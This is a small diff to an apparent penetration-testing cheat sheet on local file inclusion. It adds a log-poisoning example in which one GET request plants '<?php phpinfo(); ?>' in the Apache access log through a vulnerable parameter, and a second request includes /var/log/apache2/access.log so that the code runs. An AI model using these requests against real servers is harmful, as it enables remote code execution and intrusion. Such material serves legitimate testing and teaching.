@@ -178,7 +178,15 @@ host: <target>
 ```
 **access_log**
 
-If you find the access log, you can make a request with your php code 
+If you find the access log, you can make a GET request with your php code :
+```php
+GET <targeturi>/<vulnrable_paramter>=<?php phpinfo(); ?>
+host: <target>
+
+GET <targeturi>/<vulnrable_paramter>=/var/log/apache2/access.log
+host: <target>
+
+```
 
 **proc/self/environ**
 
